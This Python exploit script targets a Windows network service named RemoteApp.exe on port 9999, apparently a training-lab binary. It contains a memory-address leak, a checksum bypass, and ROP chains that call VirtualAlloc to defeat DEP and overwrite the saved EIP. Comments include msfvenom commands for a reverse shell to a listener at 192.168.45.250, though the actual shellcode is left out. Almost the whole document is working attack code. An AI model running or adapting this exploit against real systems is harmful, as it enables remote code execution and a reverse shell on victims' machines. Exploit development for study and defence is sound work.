#!/usr/bin/python3

from struct import pack
import pwn
import sys

pwn.context.log_level = "WARNING"

# for RemoteApp.exe; TCPView => listens on port 9999

# $ file RemoteApp.exe
# RemoteApp.exe: PE32 executable (console) Intel 80386, for MS Windows, UPX compressed, 3 sections

# $ upx -d RemoteApp.exe
#                        Ultimate Packer for eXecutables
#                           Copyright (C) 1996 - 2024
# UPX 4.2.2       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 3rd 2024
#
#         File size         Ratio      Format      Name
#    --------------------   ------   -----------   -----------
#      96590 <-     51022   52.82%    win32/pe     RemoteApp.exe
#
# Unpacked 1 file.

# 0:003> !nmod
# 00400000 00421000 RemoteApp            /SafeSEH OFF     *ASLR *DEP C:\RemoteApp.exe

SERVER, PORT = None, 9999

def main() :
    global SERVER ; SERVER = sys.argv[1]
    kernel32 = leak(opcode=0x384, libname="KERNEL32.dll")
    exploit(kernel32)


def leak(opcode, libname):
    buf    = pack("<I", opcode) + libname.encode()
    addr   = parseAddress(sendPayload(wrapPayload(buf)), libname.encode())
    print(f"[+] Leaked address of {libname}: 0x{addr:x}")
    return addr

def wrapPayload(payload):
    """Pass checks / restrictions on input"""
    # note: there are no bad chars

    buf  = b""

    ################################################################################
    # Make first byte of input after checksum the letter 'A'
    ##############################
    # 00401A48 movzx   eax, [ebp+inbufChar1]
    # 00401A4F cmp     al, 41h ; 'A'
    buf += b"A"

    ################################################################################
    # Make second byte of input after checksum the letter 'B'
    ##############################
    # 00401AE3 movzx   eax, [ebp+inbufChar2]
    # 00401AEA cmp     al, 42h ; 'B'
    buf += b"B"

    ################################################################################
    # Prepend expected checksum to payload and send it to remote
    ##############################
    # (checksum = first DWORD of input; recv before nBytesReceived <= 4000)
    # 004019B1 mov     edx, [ebp+checksum]
    # 004019B7 mov     eax, [ebp+nBytesReceived]
    # 004019BA xor     eax, edx
    # 004019BC cmp     eax, 11223344h
    # => checksum ^ nBytesReceived = 0x11223344
    # => checksum = 0x11223344 ^ nBytesReceived
    buf        += payload
    cookie      = 0x11223344
    checksum    = cookie ^ (len(buf) + 4)
    buf         = pack("<I", checksum) + buf

    return buf

def sendPayload(buf):
    p = pwn.remote(SERVER, PORT)
    p.recvuntil(b"Type something\n").decode()
    p.send(buf)
    output = p.recvall(timeout=1)
    p.close()
    return output

def parseAddress(buf, libname):
    return int(buf.split(libname + b": ")[1].split(b"[")[0], 16)

size = 0x800 ; offBufEip = 0x7d6
def exploit(kernel32):
    # arbitrary splits for structure of the input buffer
    offBufShellcode        = offBufEip - 0x500
    offBufVirtualallocstub = offBufEip - len(virtualAllocStub())

    buf  = b""
    buf += pack("<I", 0x386)                            # opcode

    buf += b"--"                                        # padding to align to 4 byte boundary (offbufEip isn't aligned)

    buf += nopsledRop(kernel32, 0x20)
    buf += ropChainVirtualAlloc(kernel32)

    tmpPaddingSize1 = offBufShellcode - len(buf)
    assert tmpPaddingSize1 >= 0
    buf += b"a" * tmpPaddingSize1

    buf += nopsled()
    buf += shellcode()

    tmpPaddingSize2 = offBufVirtualallocstub - len(buf)
    assert tmpPaddingSize2 >= 0
    buf += b"b" * tmpPaddingSize2

    buf += virtualAllocStub(kernel32)

    buf += b"c" * (offBufEip - len(buf))

    buf += ropChainBackJump(kernel32)                   # saved EIP is overwritten here

    buf += b"z" * (size - len(buf))

    assert len(buf) == size
    sendPayload(wrapPayload(buf))
    print("[+] Sent exploit; reverse shell should be incoming")

def virtualAllocStub(kernel32=0):
    offKernel32Virtualalloc = 0x238c0
    buf  = b""
    buf += pack("<I", kernel32+offKernel32Virtualalloc) # Address of VirtualAlloc
    buf += b"BBBB"                                      # Return address (shellcode address on stack)
    buf += b"CCCC"                                      # lpAddress (shellcode address on stack)
    buf += pack("<I", 0x1000)                           # dwSize (a page should be enough)
    buf += pack("<I", 0x1000)                           # flAllocationType (0x1000=MEM_COMMIT)
    buf += pack("<I", 0x40)                             # flProtect (0x40=PAGE_EXECUTE_READWRITE)
    return buf

def ropChainBackJump(kernel32=0):
    buf  = b""
    buf += pack("<I", kernel32 + 0x6fa2f)               # push esp ; pop esi ; ret
    buf += pack("<I", kernel32 + 0x712a4)               # mov eax, esi ; pop esi
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0xf8f2)                # pop ebp
    buf += pack("<i", -(offBufEip - 0x2 - 0x10))
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x6db79)               # xchg eax, esp
    return buf

def ropChainVirtualAlloc(kernel32=0):
    buf  = b""

    # align ecx with shellcode address
    offEaxShellcode = -0x51c
    buf += pack("<I", kernel32 + 0xf8f2)                # pop ebp
    buf += pack("<i", offEaxShellcode)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp
    buf += pack("<I", kernel32 + 0x19a3d)               # mov ecx, eax ; mov eax, ecx ; pop ebp
    buf += b"jjjj"                                      # junk

    # align eax with return address of VirtualAlloc on stack
    offEaxRetaddrslot = 0x4ec
    buf += pack("<I", kernel32 + 0xf8f2)                # pop ebp
    buf += pack("<i", offEaxRetaddrslot)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp

    # patch return address on stack
    buf += pack("<I", kernel32 + 0x1cc9b)               # mov  [eax], ecx ; pop ebp ; retn 0x0008
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0xfe7b)                # ret
    buf += b"j" * 8                                     # junk

    # align eax with lpAddress on stack
    buf += pack("<I", kernel32 + 0xee5f) * 4            # inc eax

    # patch lpAddress on stack
    buf += pack("<I", kernel32 + 0x1cc9b)               # mov  [eax], ecx ; pop ebp ; retn 0x0008
    buf += b"jjjj"                                      # junk
    buf += pack("<I", kernel32 + 0xfe7b)                # ret
    buf += b"j" * 8                                     # junk

    # align eax with call to VirtualAlloc
    offEaxVirtualallocstub = -0x8
    buf += pack("<I", kernel32 + 0xf8f2)                # pop ebp
    buf += pack("<i", -0x8)
    buf += pack("<I", kernel32 + 0x38ec5)               # add eax, ebp

    # buf += pack("<I", kernel32 + 0x6dd00)             # int3 (debug gadget)

    # 0:003> dds @eax L6
    # 01057ed8  775438c0 KERNEL32!VirtualAllocStub
    # 01057edc  010579f0
    # 01057ee0  010579f0
    # 01057ee4  00001000
    # 01057ee8  00001000
    # 01057eec  00000040

    # actually stack pivot
    buf += pack("<I", kernel32 + 0x6db79)               # xchg eax, esp

    return buf

def nopsled(length=0x10):
    return b"\x90" * length

def nopsledRop(kernel32, length=0x10):
    return pack("<I", kernel32 + 0xfe7b) * length       # ret

def shellcode():
    buf  = b""
    # buf += b"\xcc\x90\x90\x90"                        # int3 / debugging

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.250 LPORT=443 -f python -e x86/xor_dynamic
    # msfvenom -p windows/exec CMD=calc.exe -f python
    # nc -vlnp 443

    # own shellcode works flawlessly; msfvenom for reverse shell doesn't work :( idk why (calc works)

    # python3 ./assemble.py reverse-shell-1.asm  python
    print("[!] Shellcode omitted...") ; exit(1)

    buf += b"\xeb\xfe"
    return buf

if __name__ == "__main__":
    main()
